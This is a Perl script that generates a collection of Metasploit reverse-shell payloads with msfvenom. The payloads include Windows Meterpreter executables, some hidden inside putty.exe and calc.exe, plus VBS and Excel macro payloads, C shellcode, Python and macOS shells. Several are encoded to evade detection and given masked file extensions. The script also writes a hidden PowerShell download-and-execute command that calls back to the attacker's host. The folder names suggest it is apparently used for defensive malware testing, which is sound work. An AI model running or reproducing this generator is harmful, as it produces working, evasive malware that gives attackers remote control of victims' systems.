#!/usr/bin/perl
use strict;
use warnings;

  my($LHOST, $LPORT, $PROJECT, $PROJECTNUM);
  my($fileNdx,  $targetFolder, $IoE);
  my($payload, $platform_arch , $commandControl );
  my($currentFileName, $encoder,$cmd, $OUTFILE);
  my($archiveFolder);
  my($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst);

  $LHOST = shift or die "Expecting an IP address in arg 1";  
  $LPORT = shift or die "Expecting a TCP Port address in arg 2";  
  $PROJECT = shift or die "Expecting a Project Name in arg 3"; 
  $PROJECTNUM = shift or die "Expecting a Project Number in arg 4";
 

  $targetFolder="/opt/malwaredefense/current";
  `mkdir -p $targetFolder`;
 
  $fileNdx=0;
  $payload = '-p windows/meterpreter/reverse_tcp';
  $platform_arch = '--platform win -ax86';
  $commandControl = "lhost=$LHOST lport=$LPORT";
  $encoder = "-e generic/none";

  #archive the old version
  ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
  $archiveFolder="/opt/malwaredefense/archive" . (${year} + 1900) . sprintf("%02d",(${mon}+1)) . sprintf("%02d",${mday});
  $archiveFolder.= "_" . sprintf("%02d",${hour}). sprintf("%02d",${min}). sprintf("%02d",${sec});
  `mkdir -p $archiveFolder`;
  `mv $targetFolder/* $archiveFolder/`;

  ###################
  ##
  ##  Basic Delivery
  ##
  ##################

  `touch $targetFolder/000-StartMSF900.cue`; 
  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/001-$PROJECT-$PROJECTNUM-BasicMeterpreter-32.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/002-$PROJECT-$PROJECTNUM-Meterpreter-packed-putty-32.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;

  
  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/003-$PROJECT-$PROJECTNUM-Meterpreter-32.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/004-$PROJECT-$PROJECTNUM-Meterpreter-32.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;


  ###################
  ##
  ##  Basic Delivery + Encoding
  ##
  ##################

  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';

  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/011-$PROJECT-$PROJECTNUM-BasicMeterpreter-32enc.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/012-$PROJECT-$PROJECTNUM-Meterpreter-packed-putty-32enc.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


   $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/013-$PROJECT-$PROJECTNUM-Meterpreter-32enc.vbs";
   print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;


  #tuning encoder down to 1 for VBA
  #consistently had issues with this running.
  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/014-$PROJECT-$PROJECTNUM-Meterpreter-32enc.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  `touch $targetFolder/050-$PROJECT-$PROJECTNUM-RepeatWith905.cue`;



  ###################
  ##
  ##  64bit Delivery 
  ##
  ##################


  $platform_arch = '--platform win -ax86_64';
  $payload = '-p windows/x64/meterpreter/reverse_tcp';
  $encoder = ''; 
  
  `touch $targetFolder/100-StartMSF910.cue`; 

  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/101-$PROJECT-$PROJECTNUM-BasicMeterpreter-64.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/102-$PROJECT-$PROJECTNUM-Meterpreter-packed-calc-64.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/103-$PROJECT-$PROJECTNUM-Meterpreter-64.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/104-$PROJECT-$PROJECTNUM-Meterpreter-64.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;

  ###################
  ##
  ##  64bit Delivery + Encoding
  ##
  ##################

  $encoder ='-e x64/xor -i 3';

  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/111-$PROJECT-$PROJECTNUM-BasicMeterpreter-64enc.exe";
  print "\n\n*** Most Basic Meterpreter: $cmd";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/112-$PROJECT-$PROJECTNUM-Meterpreter-packed-calc-64enc.exe";
  print "\n\n*** Meterpreter packed into putty: $cmd \n";
  `$cmd`;


  $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/113-$PROJECT-$PROJECTNUM-Meterpreter-64enc.vbs";
  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;

  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/114-$PROJECT-$PROJECTNUM-Meterpreter-64enc.vba";
  print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;


  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/115-$PROJECT-$PROJECTNUM-CShellCode-64enc.c";
  print "\n\n*** Meterpreter vba  C Shell Code: $cmd\n";
  `$cmd`;
  `cp ./inc/meterpreter_x64.c $targetFolder/115-$PROJECT-$PROJECTNUMMeterpreterTemplate.c`;
  `echo "#!/bin/sh" >$targetFolder/115-$PROJECT-$PROJECTNUMMeterpreterGen.sh`;
  `echo "x86_64-w64-mingw32-gcc 115-$PROJECT-$PROJECTNUMMeterpreterTemplate.c  -o 115-$PROJECT-$PROJECTNUM-Meterpreter-CustomTemplate.exe" >>$targetFolder/115-$PROJECT-$PROJECTNUMMeterpreterGen.sh`;
  `chmod +x i$targetFolder/115-$PROJECT-$PROJECTNUMMeterpreterGen.sh`;

  #Original: msfvenom --platform win -ax86_64 -e x64/xor -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=443 -f c >shellcode.c 2>&1

  `touch $targetFolder/150-$PROJECT-$PROJECTNUM-RepeatWith915.cue`;



  print "Copy the Invoke-shellcode.ps1 to the target directory \n";
  print "Checking if PowerSploit is installed... \n";
  if (-d "/opt/PowerSploit") {
    print "PowerSploit is already installed \n";
  }
  else {
    print "Installing PowerSploit now in /opt/ \n";
    `cd /opt/ && git clone https://github.com/mattifestation/PowerSploit.git > /dev/null 2>&1 && cd /opt/PowerSploit/ && wget -q https://raw.githubusercontent.com/obscuresec/random/master/StartListener.py && wget -q https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py`;
  }
  `touch $targetFolder/200-$PROJECT-$PROJECTNUM-Run950.cue`;
  my ($ShellCodePath) ="./701_Invoke-Shellcode.ps1";
  `cp $ShellCodePath $targetFolder/701_Invoke-Shellcode.ps1`;
  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/701_Invoke-Shellcode.ps1`;
  $cmd = "powershell.exe -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/200_Invoke-Shellcode.ps1'))";
  open( $OUTFILE, '>', "$targetFolder/201_PScommand.txt");
  print $OUTFILE $cmd;
  close $OUTFILE;

  `touch $targetFolder/300-$PROJECT-$PROJECTNUM-run960.cue`;
  `touch $targetFolder/300-$PROJECT-$PROJECTNUM-run965.cue`;


  ###################
  ##
  ##  Python
  ##
  ##################
 
 `touch $targetFolder/400-$PROJECT-$PROJECTNUM-run970.cue`;

  $platform_arch = "--platform Python -a python";
  $encoder = "-e generic/none";
  $payload = "-p python/meterpreter/reverse_tcp";
  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} $encoder > $targetFolder/401-$PROJECT-$PROJECTNUM-Meterpreter-python.py";
  print "\n\n*** Meterpreter python: $cmd\n";
  `$cmd`;
  #original: msfvenom -e generic/none --platform Python -a python -p python/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=443 >400-$PROJECT-$PROJECTNUM-Python.py



  ###################
  ##
  ##  MAC
  ##
  ##################

 `touch $targetFolder/500-$PROJECT-$PROJECTNUM-run975.cue`;

  $platform_arch = "--platform OSX -a x86";
  $encoder = '-e generic/none -b "\x00"';
  $payload = "-p osx/x86/shell_reverse_tcp";
  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/501-$PROJECT-$PROJECTNUM-shell.macho";
  print "\n\n*** Meterpreter mac: $cmd\n";
  `$cmd`;

  ###################
  ##
  ##  exe masking
  ##
  ##################

  my($originalFile,$maskedFile);
  opendir (DIR, $targetFolder) or die $!;
  while (my $originalFile = readdir(DIR)) {
    $_ = $originalFile;
    if (/cue$/ || /txt$/){next;}
    $maskedFile = $originalFile;
    $maskedFile =~ s/.$/_/;
    `cp $targetFolder/$originalFile $targetFolder/$maskedFile`; 
  }
  closedir(DIR);



  ###################
  ##
  ##  zip it up for USB/Download fast transfer
  ##
  ##################
#  `zip -r $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip $targetFolder/*`;




 
#Needs additional work
#  print "\n\n*** Meterpreter Java  (Paste into Java and compile) \n";
#  #`msfvenom ${payload} ${platform_arch} ${commandControl} -f java $encoder > ${currentFileName}.java`;
#  `msfvenom -p java/meterpreter/reverse_tcp ${platform_arch} ${commandControl} -f raw $encoder -o ${currentFileName}.jar`;
